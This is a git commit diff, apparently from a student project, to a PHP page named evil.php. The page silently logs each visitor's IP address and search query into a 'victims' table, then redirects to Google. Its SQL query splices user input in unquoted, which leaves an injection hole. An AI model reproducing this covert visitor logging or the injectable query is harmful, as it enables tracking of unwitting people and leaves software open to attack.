8aa3edc818e1de0996f403f1ad52b37050a58e95
Andy Su <andy.su@dawsoncollege.qc.ca>
2021-12-21 11:15:54 -0500

    Update evil.php

--- evil.php
+++ evil.php
@@ -20,9 +20,9 @@
             $q = htmlspecialchars($_GET['query']);
 
         
-            $sql = "INSERT INTO victims (ip, q) VALUES ('{$ip}', {$q});";
+            $sql = "INSERT INTO victims (ip, query) VALUES ('{$ip}', {$q});";
             $result = mysqli_query($conn, $sql);
-            
+
             $url= "https://www.google.com/search?q=" . $q;
             header("Location: $url"); 
 
